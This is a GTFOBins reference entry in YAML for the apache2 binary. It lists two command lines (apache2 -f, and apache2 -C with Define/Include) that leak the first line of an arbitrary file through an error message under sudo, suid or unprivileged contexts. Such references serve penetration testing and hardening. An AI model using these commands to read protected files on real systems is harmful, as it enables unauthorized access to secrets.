<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/apache2 -->
---
functions:
  file-read:
  - binary: false
    code: |-
      apache2 -f /path/to/input-file
    comment: |-
      The first line may be leaked as an error message.
    contexts:
      sudo:
      suid:
      unprivileged:
  - binary: false
    code: |-
      apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'
    comment: |-
      The first line may be leaked as an error message.
    contexts:
      sudo:
      suid:
      unprivileged:
...
